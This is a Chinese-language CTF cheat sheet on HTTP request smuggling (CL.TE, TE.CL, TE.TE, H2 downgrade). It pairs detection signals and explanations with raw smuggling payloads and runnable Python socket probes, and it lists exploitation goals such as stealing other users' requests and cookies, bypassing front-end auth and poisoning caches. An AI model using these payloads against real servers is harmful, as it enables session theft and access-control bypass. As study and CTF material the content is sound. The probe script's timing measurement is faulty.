---
title: HTTP 请求走私（CL.TE / TE.CL / TE.TE 与 H2 降级）
category: web
tags: [request-smuggling, cl-te, te-cl, h2-downgrade, http2]
signals:
  - "响应头 Server: nginx，但报错栈是 Tomcat 或 Gunicorn"
  - "响应里出现 Via: 或 X-Cache: 说明存在反向代理层"
  - "构造非法 chunked 请求后，下一个请求才返回 400"
  - "题面提示词出现 反代 / 前后端不一致 / smuggling"
  - "同时出现 Content-Length 与 Transfer-Encoding: chunked"
  - "响应头里出现两个 Content-Length 或两个 Transfer-Encoding"
  - "浏览器侧是 HTTP/2，而回源响应是 HTTP/1.1"
  - "请求路径或 header 值里能塞进 %0d%0a"
  - "题面要求让 admin 访问 /admin 或拿到他人会话"
difficulty: hard
source: "PortSwigger / James Kettle"
tools: [burpsuite, python, http-smuggler]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 响应头组合异常：`Server: nginx` + `X-Powered-By: Servlet/3.1`，或 `Server: cloudflare` + 后端 500 堆栈。
- 出现 `Via:`、`X-Cache:`、`X-Forwarded-For:` → 明确有反向代理 + 后端两层。
- 题面提示：`反代`、`前后端`、`proxy`、`smuggling`、`走私`、`chunked`、`TE`、`Content-Length`。
- 用 `Transfer-Encoding: chunked` 且 body 不合法时，前端放行而后端 400（或反之）。
- 有 bot/爬虫访问、要求"让 admin 访问"、有 CSRF token 但能"绕过一次"。
- 出现 HTTP/2 且路径里可以塞 `\r\n`（`%0d%0a`）。
- 响应时间异常：有时慢、有时快（队列错位）。

## 二、原理

### 1. 两层解析器，两套规则

前端（CDN/Nginx）和后端（Tomcat/Gunicorn）**对同一段字节的请求边界判断不同**：

| 差异 | 前端认为 | 后端认为 | 类型 |
|---|---|---|---|
| 同时有 `CL` 与 `TE` | 用 TE | 用 CL | CL.TE |
| 同时有 `CL` 与 `TE` | 用 CL | 用 TE | TE.CL |
| 重复 `TE`（`chunked\n identity`） | 用第一个 | 用第二个 | TE.TE |
| header 用 `\n` 而非 `\r\n` 结尾 | 容忍 | 不容忍 | 变种 |
| `Transfer-Encoding : chunked`（空格/tab） | 识别 | 不识别 | TE.TE |

### 2. CL.TE（最常见）

```
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

前端按 `CL: 13` 只转发前 13 字节（`0\r\n\r\nSMUGGL`），剩 `ED` 留在连接里；后端按 chunked 读到 `0` 结束 → 后面的字节成为**下一个请求**。

### 3. TE.CL

```
POST / HTTP/1.1
Host: target
Content-Length: 6
Transfer-Encoding: chunked
3
abc
0
```

前端按 CL 只转发 6 字节（`3\r\n`），后端按 chunked 读到 `abc` 后继续等数据；残留内容成了后续请求头。

### 4. TE.TE：让其中一端不认 TE

`Transfer-Encoding: identity`、`Transfer-Encoding : chunked`、`Transfer-Encoding:\tchunked`、`Transfer-Encoding: xchunked` —— 挑一个"一端不识别"的写法。

### 5. HTTP/2 降级走私（H2.CL / H2.TE）

前端是 HTTP/2、后端 HTTP/1.1 时，前端转 H1 **不校验 `content-length` 与实际 body 是否一致**，也不禁止 `transfer-encoding`：

```
POST / HTTP/2
Content-Length: 0
Transfer-Encoding: chunked

<arbitrary bytes>
```

降级后 http 层用 TE 解析到残留 → 后续请求被"吞"进去。H2 的 `:path` 里注入 `\r\n` 同理。

### 6. 利用场景

| 场景 | 效果 |
|---|---|
| 绕过前端鉴权 | 前端看到 `/public`，后端看到 `/admin` |
| 前缀劫持 | 偷取下一个用户的请求（含 cookie） |
| 缓存投毒 | 中毒响应写入 CDN（见 `web-cache-poisoning-deception.md`） |
| CSRF 绕过 | 受害者浏览器带 cookie 发请求，我们注入 |

## 三、解题步骤

1. **确认两层**：`Server`、`Via`、`X-Cache`、`X-Powered-By` 全都看一遍。
2. **探 CL.TE**：`CL: 13` + `TE: chunked`，body `0\r\n\r\nSMUGGLED`；第二次请求超时或错位即命中。
3. **探 TE.CL**：`CL: 4` + `TE: chunked`，body `5c\r\nGPOST /404-xyz ...\r\n0\r\n\r\n`；后端等数据即命中。
4. **确认生效**：伪造 `/404-xyz` 塞在 body 后，后续请求命中 404 即走私成功。
5. **H2 降级**：Burp 切 HTTP/2，注入 `Transfer-Encoding: chunked` + `Content-Length: 0`。
6. **利用前缀**：把下一请求的 `Host`/`Cookie` 拼进自己的请求头，或制造缓存中毒。
7. **CTF 目标**：让 bot 带管理员 cookie 访问 `/admin`，把 flag 外带到我们的服务器。

## 四、可直接运行的脚本

用原始 socket 发 CL.TE 探测（**别用 requests，它会重写 header**）：

```python
import socket, time

HOST, PORT = "TARGET", 80

def raw(payload: bytes, timeout=6):
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    s.sendall(payload)
    time.sleep(1.5)
    try:
        s.sendall(b"GET /404-xyz HTTP/1.1\r\nHost: %s\r\n\r\n" % HOST.encode())
        data = s.recv(65535)
    except socket.timeout:
        data = b"<TIMEOUT>"
    s.close()
    return data

# CL.TE：CL 小、TE 大，残留 "SMUGGLED" 成为下一请求开头
cl_te = (b"POST / HTTP/1.1\r\nHost: " + HOST.encode() +
         b"\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n"
         b"0\r\n\r\nSMUGGLED")
# TE.CL：CL 小、TE 让后端继续等数据
te_cl = (b"POST / HTTP/1.1\r\nHost: " + HOST.encode() +
         b"\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
         b"5c\r\nGPOST /404-xyz HTTP/1.1\r\nHost: " + HOST.encode() +
         b"\r\n\r\n0\r\n\r\n")

for name, p in [("CL.TE", cl_te), ("TE.CL", te_cl)]:
    t0 = time.time()
    print(name, "%.2fs" % (time.time() - t0), raw(p)[:200])
```

TE.TE 混淆变体（逐条试）：

```python
VARS = [("Transfer-Encoding: chunked",), ("Transfer-Encoding: identity",),
        ("Transfer-Encoding : chunked",), ("Transfer-Encoding:\tchunked",),
        ("transfer-encoding: chunked",), ("Transfer-Encoding: xchunked",)]

for a in VARS:
    for b in VARS:
        if a is b: continue
        hdr = a[0] + "\r\n" + b[0] + "\r\n"
        req = ("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 6\r\n%s\r\n"
               "3\r\nabc\r\n0\r\n\r\n") % (HOST, hdr)
        print(repr(hdr))          # 实际发送用 raw(req.encode())
```

Burp 侧最省事：装 **HTTP Request Smuggler** 插件 → `Extensions → HTTP Request Smuggler → Smuggle probe`。

## 五、常见坑 / 变体

- **`requests` 会报错**：`InvalidHeader` 不允许 `\r\n`，也不允许 `Content-Length` 与 `Transfer-Encoding` 共存 → 用 raw socket 或 Burp。
- **前端归一化**：Nginx 默认把 `TE` 改成 `chunked` 并按 CL 判定，CL.TE 常被打；换 TE.CL 或 TE.TE。
- **后端 HTTP/1.0**：不认 chunked，直接 400 → 走私不成立。
- **连接复用是前提**：CDN 保持 keep-alive 才有效，前端每次新建连接则走私无效。
- **H2 场景**：Burp 切 HTTP/2 时 header 名必须小写；`:path` 注入要服务端接受。
- **变体：H2.CL** → `Content-Length: 0` 再跟残留 body；TE.TE 同理。
- **变体：双 CL** → 前端取第一个、后端取最后一个。
- **CTF 常见目标** → 走私 admin 请求后抢答，或让 bot 带 cookie 访问 `/admin` 外带 flag。
- **测速注意**：走私会污染连接池，每次复测前重连；别把别人的会话打崩。

## 六、参考来源

- [PortSwigger — HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger — Advanced request smuggling](https://portswigger.net/web-security/request-smuggling/advanced)
- [PortSwigger Research — HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2)
- [HackTricks — HTTP Request Smuggling](https://book.hacktricks.wiki/en/pentesting-web/http-request-smuggling/index.html)
- [Fastly — What is HTTP Request Smuggling](https://www.fastly.com/learning/security/what-is-http-request-smuggling)
- [RFC 9110 — HTTP Semantics](https://www.rfc-editor.org/rfc/rfc9110)
